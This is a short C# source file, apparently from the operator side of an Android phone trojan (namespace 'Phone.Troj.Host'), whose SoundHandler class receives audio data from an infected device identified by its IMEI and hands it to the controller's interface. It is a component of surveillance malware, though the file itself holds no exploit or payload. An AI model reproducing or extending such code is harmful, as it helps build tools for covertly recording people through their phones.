using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class SoundHandler : IPacketHandler
    {
        private IMainView gui;
        private int channel;
        private string imei;

        public SoundHandler(int channel, string imei, IMainView gui)
        {
            this.gui = gui;
            this.channel = channel;
            this.imei = imei;
        }


        public void Receive(IPacket p, string tempIMEI)
        {
        
        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Sound data has been received");
            c.ChannelHandlerMap[imei].GetStorage(channel).Reset();
            var packet = (RawPacket)p;
            gui.AddSoungBytes(imei, packet.Data);
        }
    }
}
